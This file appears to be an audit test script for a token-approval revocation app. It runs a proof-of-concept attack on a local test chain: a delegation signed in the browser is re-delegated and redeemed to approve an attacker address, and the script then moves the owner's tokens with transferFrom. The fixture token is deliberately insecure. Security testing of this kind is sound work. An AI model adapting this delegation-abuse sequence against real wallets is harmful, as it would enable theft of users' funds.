import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createRequire } from "node:module";
import { spawn } from "node:child_process";
import { fileURLToPath } from "node:url";
import {
  bytesToHex,
  createPublicClient,
  createWalletClient,
  encodeAbiParameters,
  encodeFunctionData,
  http,
  parseAbi,
  pad,
  recoverTypedDataAddress,
  toHex,
} from "viem";
import { mnemonicToAccount } from "viem/accounts";
import { sepolia } from "viem/chains";
import {
  ExecutionMode,
  Implementation,
  createDelegation,
  createExecution,
  getSmartAccountsEnvironment,
  signDelegation,
  toMetaMaskSmartAccount,
} from "@metamask/smart-accounts-kit";
import {
  createCaveatBuilder,
  decodeRevertReason,
  deploySmartAccountsEnvironment,
  hashDelegation,
  overrideDeployedEnvironment,
} from "@metamask/smart-accounts-kit/utils";
import { DelegationManager } from "@metamask/smart-accounts-kit/contracts";

process.env.DO_NOT_TRACK = "1";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, "..");
const require = createRequire(import.meta.url);
const runtimeRoot = process.env.I08_RUNTIME_ROOT ?? path.resolve(repoRoot, "../direct-manager/tools/runtime");
const runtimeRequire = createRequire(path.join(runtimeRoot, "package.json"));
const ganache = runtimeRequire("ganache");
const solc = runtimeRequire("solc");
const { chromium } = require("playwright-core");

const mnemonic =
  "test test test test test test test test test test test junk";
const chainId = sepolia.id;
const rpcPort = 8548;
const vitePort = 4174;
const rpcUrl = `http://127.0.0.1:${rpcPort}`;
const appUrl = `http://127.0.0.1:${vitePort}/browser-test.html`;
const tempRoot = path.resolve(repoRoot, "../browser-process-tmp");
fs.mkdirSync(tempRoot, { recursive: true });
const runDir = fs.mkdtempSync(path.join(tempRoot, "i08-browser-"));
const outputPath = path.resolve(
  __dirname,
  "../artifacts/browser-experiment.json",
);
const screenshotPath = path.resolve(
  __dirname,
  "../artifacts/browser-after-delegation.png",
);

const operatorOwner = mnemonicToAccount(mnemonic, { addressIndex: 0 });
const coordinatorOwner = mnemonicToAccount(mnemonic, { addressIndex: 1 });
const revokerOwner = mnemonicToAccount(mnemonic, { addressIndex: 2 });
const knownSpender = mnemonicToAccount(mnemonic, { addressIndex: 4 });
const attackerSpender = mnemonicToAccount(mnemonic, { addressIndex: 5 });
const canonicalToken = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238";
const operatorPrivateKey = bytesToHex(
  (await operatorOwner.getHdKey()).privKeyBytes,
);
const coordinatorPrivateKey = bytesToHex(
  (await coordinatorOwner.getHdKey()).privKeyBytes,
);
const revokerPrivateKey = bytesToHex(
  (await revokerOwner.getHdKey()).privKeyBytes,
);

const tokenSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract AuditToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor() { balanceOf[msg.sender] = 1_000_000; }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        require(balanceOf[from] >= amount, "balance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function setAllowance(address owner, address spender, uint256 amount) external {
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setBalance(address owner, uint256 amount) external {
        balanceOf[owner] = amount;
    }
}

contract I08EntryPointRelay {
    function execute(address target, bytes calldata data) external payable {
        (bool ok,) = target.call(data);
        require(ok, "relay call failed");
    }
}
`;

function compileContracts() {
  const input = {
    language: "Solidity",
    sources: { "AuditToken.sol": { content: tokenSource } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      outputSelection: {
        "*": { "*": ["abi", "evm.bytecode.object"] },
      },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors ?? []).filter(
    (entry) => entry.severity === "error",
  );
  if (errors.length) {
    throw new Error(errors.map((entry) => entry.formattedMessage).join("\n"));
  }
  const token = output.contracts["AuditToken.sol"].AuditToken;
  const relay = output.contracts["AuditToken.sol"].I08EntryPointRelay;
  return {
    token: {
      abi: token.abi,
      bytecode: `0x${token.evm.bytecode.object}`,
    },
    relay: {
      abi: relay.abi,
      bytecode: `0x${relay.evm.bytecode.object}`,
    },
  };
}

const compiled = compileContracts();
const tokenArtifact = compiled.token;
const relayArtifact = compiled.relay;
const tokenAbi = tokenArtifact.abi;
const relayAbi = relayArtifact.abi;
const approveAbi = parseAbi([
  "function approve(address spender, uint256 amount) returns (bool)",
]);
const multicallAbi = parseAbi([
  "struct Call3 { address target; bool allowFailure; bytes callData; }",
  "struct Result { bool success; bytes returnData; }",
  "function aggregate3(Call3[] calls) payable returns (Result[] returnData)",
]);

const ganacheServer = ganache.server({
  chain: {
    chainId,
    networkId: chainId,
    hardfork: "shanghai",
  },
  wallet: {
    mnemonic,
    totalAccounts: 12,
    defaultBalance: 1000,
  },
  miner: {
    blockGasLimit: 30_000_000,
    callGasLimit: 50_000_000,
  },
  database: {
    dbPath: path.join(runDir, "chain"),
  },
  logging: { quiet: true },
});

let viteProcess;
let browser;
let publicClient;
let adminWallet;
let debugState = {};
const browserConsole = [];
const pageErrors = [];
const signRequests = [];
let result;

async function waitForHttp(url, timeoutMs = 30_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(url);
      if (response.ok) return;
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error(`Timed out waiting for ${url}`);
}

async function deployHybrid(owner, salt) {
  const account = await toMetaMaskSmartAccount({
    client: publicClient,
    implementation: Implementation.Hybrid,
    deployParams: [owner.address, [], [], []],
    deploySalt: salt,
    signer: { account: owner },
  });
  return account;
}

async function deployAccount(account, walletClient) {
  if (await account.isDeployed()) return "already";
  const { factory, factoryData } = await account.getFactoryArgs();
  const hash = await walletClient.sendTransaction({
    to: factory,
    data: factoryData,
  });
  await publicClient.waitForTransactionReceipt({ hash });
  return hash;
}

try {
  await ganacheServer.listen(rpcPort, "127.0.0.1");
  publicClient = createPublicClient({
    chain: sepolia,
    transport: http(rpcUrl),
  });
  adminWallet = createWalletClient({
    chain: sepolia,
    transport: http(rpcUrl),
    account: operatorOwner,
  });

  const environment = await deploySmartAccountsEnvironment(
    adminWallet,
    publicClient,
    sepolia,
  );
  overrideDeployedEnvironment(chainId, "1.3.0", environment);

  const operatorAccount = await deployHybrid(operatorOwner, "0x");
  const coordinatorAccount = await deployHybrid(coordinatorOwner, "0x1");
  const revokerAccount = await deployHybrid(revokerOwner, "0x2");

  const tokenDeployment = await adminWallet.deployContract({
    abi: tokenAbi,
    bytecode: tokenArtifact.bytecode,
  });
  const tokenReceipt =
    await publicClient.waitForTransactionReceipt({ hash: tokenDeployment });
  const deployedTokenAddress = tokenReceipt.contractAddress;
  if (!deployedTokenAddress) throw new Error("No token address");
  const tokenRuntime = await publicClient.getCode({
    address: deployedTokenAddress,
  });
  if (!tokenRuntime || tokenRuntime === "0x") {
    throw new Error("Token fixture has no runtime code");
  }
  await ganacheServer.provider.request({
    method: "evm_setAccountCode",
    params: [canonicalToken, tokenRuntime],
  });
  const tokenAddress = canonicalToken;

  const relayDeployment = await adminWallet.deployContract({
    abi: relayAbi,
    bytecode: relayArtifact.bytecode,
  });
  const relayReceipt = await publicClient.waitForTransactionReceipt({
    hash: relayDeployment,
  });
  if (!relayReceipt.contractAddress) {
    throw new Error("No entry-point relay address");
  }
  const relayRuntime = await publicClient.getCode({
    address: relayReceipt.contractAddress,
  });
  if (!relayRuntime || relayRuntime === "0x") {
    throw new Error("Entry-point relay has no runtime code");
  }
  await ganacheServer.provider.request({
    method: "evm_setAccountCode",
    params: [environment.EntryPoint, relayRuntime],
  });

  await publicClient.waitForTransactionReceipt({
    hash: await adminWallet.writeContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "setAllowance",
      args: [operatorAccount.address, knownSpender.address, 37n],
    }),
  });
  await publicClient.waitForTransactionReceipt({
    hash: await adminWallet.writeContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "setBalance",
      args: [operatorAccount.address, 1_000n],
    }),
  });

  const multicallCode = fs
    .readFileSync(path.join(repoRoot, "src/lib/mockErc20.ts"), "utf8")
    .match(/MULTICALL3_RUNTIME\s*=\s*("0x[0-9a-f]+")/i)?.[1];
  if (!multicallCode) throw new Error("Multicall3 runtime not found");
  await ganacheServer.provider.request({
    method: "evm_setAccountCode",
    params: ["0xcA11bde05977b3631167028862bE2a173976CA11", JSON.parse(multicallCode)],
  });

  const viteBin = path.join(repoRoot, "node_modules/vite/bin/vite.js");
  viteProcess = spawn(
    process.execPath,
    [viteBin, "--host", "127.0.0.1", "--port", String(vitePort), "--strictPort"],
    {
      cwd: repoRoot,
      env: {
        ...process.env,
        VITE_SEPOLIA_RPC: rpcUrl,
        VITE_CHAIN_ID: String(chainId),
        VITE_X402_ENABLED: "false",
        TEMP: tempRoot,
        TMP: tempRoot,
      },
      stdio: ["ignore", "pipe", "pipe"],
    },
  );
  viteProcess.stdout.on("data", (chunk) => browserConsole.push(chunk.toString()));
  viteProcess.stderr.on("data", (chunk) => browserConsole.push(chunk.toString()));
  await waitForHttp(appUrl, 30_000);

  browser = await chromium.launch({
    headless: true,
    executablePath: process.env.I08_EDGE_EXE ?? "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
  });
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const page = await context.newPage();
  page.on("console", (message) =>
    browserConsole.push(`${message.type()}: ${message.text()}`),
  );
  page.on("pageerror", (error) => pageErrors.push(error.message));

  await page.exposeFunction("__i08Rpc", async (method, params = []) => {
    switch (method) {
      case "eth_requestAccounts":
      case "eth_accounts":
        return [operatorOwner.address];
      case "eth_chainId":
        return toHex(chainId);
      case "net_version":
        return String(chainId);
      case "wallet_requestPermissions":
        return [{ parentCapability: "eth_accounts" }];
      case "wallet_getPermissions":
        return [{ parentCapability: "eth_accounts" }];
      case "wallet_switchEthereumChain":
      case "wallet_addEthereumChain":
      case "wallet_revokePermissions":
        return null;
      case "eth_signTypedData":
      case "eth_signTypedData_v3":
      case "eth_signTypedData_v4": {
        const typedData =
          typeof params[1] === "string" ? JSON.parse(params[1]) : params[1];
        if (typedData.domain?.chainId) {
          typedData.domain.chainId = Number(typedData.domain.chainId);
        }
        const signature = await operatorOwner.signTypedData(typedData);
        signRequests.push({ method, typedData, signature });
        return signature;
      }
      case "personal_sign": {
        const data = params[0];
        return await operatorOwner.signMessage({
          message: typeof data === "string" ? { raw: data } : data,
        });
      }
      case "eth_sendTransaction": {
        const transaction = { ...params[0], from: operatorOwner.address };
        return await ganacheServer.provider.request({
          method,
          params: [transaction],
        });
      }
      default:
        return await ganacheServer.provider.request({ method, params });
    }
  });

  await context.addInitScript(
    ({ ethereumAddress, environment, agentKey, subAgentKey }) => {
      const accounts = [ethereumAddress];
      const ethereum = {
        isMetaMask: true,
        providers: [],
        request: async ({ method, params }) =>
          await window.__i08Rpc(method, params ?? []),
        on: () => {},
        removeListener: () => {},
        removeAllListeners: () => {},
        _metamask: { isUnlocked: async () => true },
      };
      ethereum.providers = [ethereum];
      Object.defineProperty(window, "ethereum", {
        value: ethereum,
        configurable: true,
      });
      Object.defineProperty(window, "__I08_ENVIRONMENT__", {
        value: environment,
        configurable: true,
      });
      localStorage.setItem(
        "ss-config",
        JSON.stringify({
          chainId: 11155111,
          veniceApiKey: "",
          alchemyApiKey: "",
          pimlicoApiKey: "",
          etherscanApiKey: "",
          x402Enabled: false,
          relayerMode: "pimlico",
          webhookUrl: "",
        }),
      );
      localStorage.setItem("scamslayer-agent-key", agentKey);
      localStorage.setItem("scamslayer-subagent-key", subAgentKey);
      window.__I08_ACCOUNTS__ = accounts;
    },
    {
      ethereumAddress: operatorOwner.address,
      environment,
      agentKey: coordinatorPrivateKey,
      subAgentKey: revokerPrivateKey,
    },
  );

  await page.route(
    (url) => !["127.0.0.1", "localhost"].includes(url.hostname),
    (route) => route.abort(),
  );
  await page.goto(appUrl, { waitUntil: "domcontentloaded", timeout: 60_000 });
  await page.getByRole("button", { name: /Connect MetaMask/i }).click();
  await page.getByText("Let the agent revoke for you").waitFor({ timeout: 120_000 });

  const beforeGrantText = await page.locator("body").innerText();
  await page
    .getByRole("button", { name: /Sign in MetaMask to continue/i })
    .click();
  await page
    .getByText(/Under the hood/i)
    .waitFor({ timeout: 120_000 });
  const afterGrantText = await page.locator("body").innerText();
  await page.screenshot({ path: screenshotPath, fullPage: true });

  const rootSign = [...signRequests]
    .reverse()
    .find(
      (request) =>
        request.typedData?.primaryType === "Delegation" &&
        request.typedData?.message?.delegator?.toLowerCase() ===
          operatorAccount.address.toLowerCase() &&
        request.typedData?.message?.delegate?.toLowerCase() ===
          coordinatorAccount.address.toLowerCase(),
    );
  if (!rootSign) throw new Error("No I08 root delegation signature captured");

  const normalizedSalt = BigInt(rootSign.typedData.message.salt);
  const signedRoot = {
    ...rootSign.typedData.message,
    salt: toHex(normalizedSalt, { size: 32 }),
    signature: rootSign.signature,
  };
  const recoveredRootSigner = await recoverTypedDataAddress({
    domain: rootSign.typedData.domain,
    types: rootSign.typedData.types,
    primaryType: rootSign.typedData.primaryType,
    message: rootSign.typedData.message,
    signature: rootSign.signature,
  });
  const independentlySignedRootSignature = await signDelegation({
    privateKey: operatorPrivateKey,
    delegation: signedRoot,
    delegationManager: environment.DelegationManager,
    chainId,
  });
  const rootHash = hashDelegation(signedRoot);
  const child = createDelegation({
    environment,
    from: coordinatorAccount.address,
    to: revokerAccount.address,
    parentDelegation: signedRoot,
    caveats: createCaveatBuilder(environment)
      .addCaveat("limitedCalls", { limit: 5 })
      .build(),
  });
  const childSignature = await signDelegation({
    privateKey: coordinatorPrivateKey,
    delegation: child,
    delegationManager: environment.DelegationManager,
    chainId,
  });
  const signedChild = { ...child, signature: childSignature };

  const operatorDeploymentDiagnostic = await deployAccount(
    operatorAccount,
    adminWallet,
  );
  const coordinatorDeploymentDiagnostic = await deployAccount(
    coordinatorAccount,
    adminWallet,
  );
  const revokerDeploymentDiagnostic = await deployAccount(
    revokerAccount,
    adminWallet,
  );
  await publicClient.waitForTransactionReceipt({
    hash: await adminWallet.writeContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "setAllowance",
      args: [operatorAccount.address, attackerSpender.address, 37n],
    }),
  });
  await publicClient.waitForTransactionReceipt({
    hash: await adminWallet.writeContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "setBalance",
      args: [operatorAccount.address, 1_000n],
    }),
  });

  const attackCallData = encodeFunctionData({
    abi: approveAbi,
    functionName: "approve",
    args: [attackerSpender.address, 91n],
  });
  const execution = createExecution({
    target: tokenAddress,
    value: 0n,
    callData: attackCallData,
  });
  const directChild = createDelegation({
    environment,
    from: coordinatorAccount.address,
    to: knownSpender.address,
    parentDelegation: signedRoot,
    caveats: createCaveatBuilder(environment)
      .addCaveat("limitedCalls", { limit: 5 })
      .build(),
  });
  const directChildSignature = await signDelegation({
    privateKey: coordinatorPrivateKey,
    delegation: directChild,
    delegationManager: environment.DelegationManager,
    chainId,
  });
  const directRedeemData = DelegationManager.encode.redeemDelegations({
    delegations: [
      [{ ...directChild, signature: directChildSignature }, signedRoot],
    ],
    modes: [ExecutionMode.SingleDefault],
    executions: [[execution]],
  });
  let directEoaDiagnostic;
  try {
    const directHash = await adminWallet.sendTransaction({
      account: knownSpender,
      to: environment.DelegationManager,
      data: directRedeemData,
      gas: 5_000_000n,
    });
    const directReceipt = await publicClient.waitForTransactionReceipt({
      hash: directHash,
    });
    const directAllowance = await publicClient.readContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "allowance",
      args: [operatorAccount.address, attackerSpender.address],
    });
    directEoaDiagnostic = {
      status: directReceipt.status,
      transactionHash: directHash,
      logs: directReceipt.logs.length,
      allowanceAfter: directAllowance.toString(),
      error: null,
    };
  } catch (caught) {
    const decoded = decodeRevertReason(caught);
    directEoaDiagnostic = {
      status: "submission_error",
      transactionHash: null,
      logs: null,
      allowanceAfter: null,
      error: {
        message: caught.message,
        shortMessage: caught.shortMessage ?? null,
        details: caught.details ?? null,
        decoded,
      },
    };
  }
  await publicClient.waitForTransactionReceipt({
    hash: await adminWallet.writeContract({
      address: tokenAddress,
      abi: tokenAbi,
      functionName: "setAllowance",
      args: [operatorAccount.address, attackerSpender.address, 37n],
    }),
  });

  const redeemData = DelegationManager.encode.redeemDelegations({
    delegations: [[signedChild, signedRoot]],
    modes: [ExecutionMode.SingleDefault],
    executions: [[execution]],
  });
  const encodedExecute = await revokerAccount.encodeCalls([
    { to: environment.DelegationManager, data: redeemData },
  ]);

  const relayExecuteData = encodeFunctionData({
    abi: relayAbi,
    functionName: "execute",
    args: [revokerAccount.address, encodedExecute],
  });
  const attackTransaction = {
    from: operatorOwner.address,
    to: environment.EntryPoint,
    data: relayExecuteData,
    gas: "0x989680",
  };
  let attackEthCall;
  try {
    const returnData = await ganacheServer.provider.request({
      method: "eth_call",
      params: [attackTransaction, "latest"],
    });
    attackEthCall = { status: "success", returnData, error: null };
  } catch (caught) {
    attackEthCall = {
      status: "reverted",
      returnData: caught?.data ?? caught?.cause?.data ?? null,
      error: {
        message: caught.message,
        data: caught?.data ?? caught?.cause?.data ?? null,
        decoded: decodeRevertReason(caught),
      },
    };
  }

  const attackHash = await ganacheServer.provider.request({
    method: "eth_sendTransaction",
    params: [attackTransaction],
  });
  const attackReceipt = await publicClient.waitForTransactionReceipt({
    hash: attackHash,
  });
  const runtimeCode = {
    operator: await publicClient.getCode({ address: operatorAccount.address }),
    coordinator: await publicClient.getCode({
      address: coordinatorAccount.address,
    }),
    revoker: await publicClient.getCode({ address: revokerAccount.address }),
    manager: await publicClient.getCode({
      address: environment.DelegationManager,
    }),
    entryPoint: await publicClient.getCode({ address: environment.EntryPoint }),
  };
  let attackTraceSummary = null;
  try {
    const debugTrace = await ganacheServer.provider.request({
      method: "debug_traceTransaction",
      params: [attackHash, { disableMemory: true, disableStack: false }],
    });
    const structLogs = debugTrace.structLogs ?? [];
    attackTraceSummary = {
      gas: debugTrace.gas ?? null,
      failed: debugTrace.failed ?? null,
      returnValue: debugTrace.returnValue ?? null,
      structLogCount: structLogs.length,
      errorFrames: structLogs
        .filter((entry) => entry.error)
        .slice(0, 20)
        .map((entry) => ({
          pc: entry.pc,
          op: entry.op,
          depth: entry.depth,
          gas: entry.gas,
          error: entry.error,
        })),
      lastFrames: structLogs.slice(-20).map((entry) => ({
        pc: entry.pc,
        op: entry.op,
        depth: entry.depth,
        gas: entry.gas,
        error: entry.error ?? null,
      })),
    };
  } catch (caught) {
    attackTraceSummary = { error: caught.message };
  }
  const allowanceAfter = await publicClient.readContract({
    address: tokenAddress,
    abi: tokenAbi,
    functionName: "allowance",
    args: [operatorAccount.address, attackerSpender.address],
  });
  debugState = {
    tokenAddress,
    operatorAccount: operatorAccount.address,
    coordinatorAccount: coordinatorAccount.address,
    revokerAccount: revokerAccount.address,
    knownSpender: knownSpender.address,
    attackerSpender: attackerSpender.address,
    appSignedRootTypedData: rootSign.typedData,
    recoveredRootSigner,
    independentlySignedRootSignature,
    rootHash,
    accountDeployments: {
      operator: operatorDeploymentDiagnostic,
      coordinator: coordinatorDeploymentDiagnostic,
      revoker: revokerDeploymentDiagnostic,
    },
    directEoaDiagnostic,
    rootSignedDelegation: signedRoot,
    childSignedDelegation: signedChild,
    attackCalldata: attackCallData,
    attackEthCall,
    attackTransactionHash: attackHash,
    attackReceiptStatus: attackReceipt.status,
    attackReceiptLogs: attackReceipt.logs.length,
    attackReceipt: {
      transactionHash: attackReceipt.transactionHash,
      status: attackReceipt.status,
      blockNumber: attackReceipt.blockNumber.toString(),
      gasUsed: attackReceipt.gasUsed.toString(),
      logCount: attackReceipt.logs.length,
      logs: attackReceipt.logs.map((log) => ({
        address: log.address,
        topics: log.topics,
      })),
    },
    runtimeCodeBytes: Object.fromEntries(
      Object.entries(runtimeCode).map(([name, code]) => [
        name,
        code ? (code.length - 2) / 2 : 0,
      ]),
    ),
    allowanceAfterAttack: allowanceAfter.toString(),
    attackTraceSummary,
    beforeGrantText,
    afterGrantText,
  };
  let transferHash = null;
  let transferReceipt = null;
  let spenderBalance = 0n;
  let transferError = null;
  if (attackReceipt.status === "success") {
    try {
      transferHash = await adminWallet.writeContract({
        account: attackerSpender,
        address: tokenAddress,
        abi: tokenAbi,
        functionName: "transferFrom",
        args: [operatorAccount.address, attackerSpender.address, 55n],
      });
      transferReceipt = await publicClient.waitForTransactionReceipt({
        hash: transferHash,
      });
      spenderBalance = await publicClient.readContract({
        address: tokenAddress,
        abi: tokenAbi,
        functionName: "balanceOf",
        args: [attackerSpender.address],
      });
    } catch (caught) {
      transferError = {
        message: caught.message,
        decoded: decodeRevertReason(caught),
      };
    }
  }

  result = {
    generatedAt: new Date().toISOString(),
    appUrl,
    rpcUrl,
    sourceRevision: "0b09accf3a19bb9712b28e9c2044c7db05fec669",
    operatorEoa: operatorOwner.address,
    operatorAccount: operatorAccount.address,
    coordinatorOwner: coordinatorOwner.address,
    coordinatorAccount: coordinatorAccount.address,
    revokerOwner: revokerOwner.address,
    revokerAccount: revokerAccount.address,
    tokenAddress,
    knownSpender: knownSpender.address,
    attackerSpender: attackerSpender.address,
    appSignedRootTypedData: rootSign.typedData,
    recoveredRootSigner,
    independentlySignedRootSignature,
    rootHash,
    accountDeployments: {
      operator: operatorDeploymentDiagnostic,
      coordinator: coordinatorDeploymentDiagnostic,
      revoker: revokerDeploymentDiagnostic,
    },
    directEoaDiagnostic,
    rootSignedDelegation: signedRoot,
    childSignedDelegation: signedChild,
    entryPointSubstitution:
      "The local chain replaces EntryPoint runtime with a stateless relay at the official EntryPoint address so the official Hybrid delegate account can call DelegationManager directly. UserOperation validation is not part of this browser experiment.",
    attackCalldata: attackCallData,
    redeemCalldata: redeemData,
    attackEthCall,
    attackTransactionHash: attackHash,
    attackReceiptStatus: attackReceipt.status,
    attackReceiptLogs: attackReceipt.logs.length,
    attackReceipt: {
      transactionHash: attackReceipt.transactionHash,
      status: attackReceipt.status,
      blockNumber: attackReceipt.blockNumber.toString(),
      gasUsed: attackReceipt.gasUsed.toString(),
      logCount: attackReceipt.logs.length,
      logs: attackReceipt.logs.map((log) => ({
        address: log.address,
        topics: log.topics,
      })),
    },
    runtimeCodeBytes: Object.fromEntries(
      Object.entries(runtimeCode).map(([name, code]) => [
        name,
        code ? (code.length - 2) / 2 : 0,
      ]),
    ),
    allowanceAfterAttack: allowanceAfter.toString(),
    attackTraceSummary,
    transferTransactionHash: transferHash,
    transferReceiptStatus: transferReceipt?.status ?? "not_attempted",
    transferReceipt: transferReceipt
      ? {
          transactionHash: transferReceipt.transactionHash,
          status: transferReceipt.status,
          blockNumber: transferReceipt.blockNumber.toString(),
          gasUsed: transferReceipt.gasUsed.toString(),
          logCount: transferReceipt.logs.length,
        }
      : null,
    transferError,
    spenderBalanceAfter: spenderBalance.toString(),
    beforeGrantText,
    afterGrantText,
    pageErrors,
    browserConsole,
  };
} catch (error) {
  result = {
    generatedAt: new Date().toISOString(),
    error: error.stack || error.message,
    debugState,
    pageErrors,
    browserConsole,
  };
} finally {
  await browser?.close();
  if (viteProcess) {
    viteProcess.kill();
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
  await ganacheServer.close();
  fs.mkdirSync(path.dirname(outputPath), { recursive: true });
  fs.writeFileSync(
    outputPath,
    `${JSON.stringify(
      result,
      (_key, value) => (typeof value === "bigint" ? value.toString() : value),
      2,
    )}\n`,
  );
  fs.rmSync(runDir, { recursive: true, force: true });
}

console.log(
  JSON.stringify(
    result.error
      ? { outputPath, error: result.error, pageErrors }
      : {
          outputPath,
          screenshotPath,
          attackTransactionHash: result.attackTransactionHash,
          attackReceiptStatus: result.attackReceiptStatus,
          attackReceiptLogs: result.attackReceiptLogs,
          allowanceAfterAttack: result.allowanceAfterAttack,
          transferTransactionHash: result.transferTransactionHash,
          transferReceiptStatus: result.transferReceiptStatus,
          spenderBalanceAfter: result.spenderBalanceAfter,
        },
    null,
    2,
  ),
);
if (result.error) process.exitCode = 1;
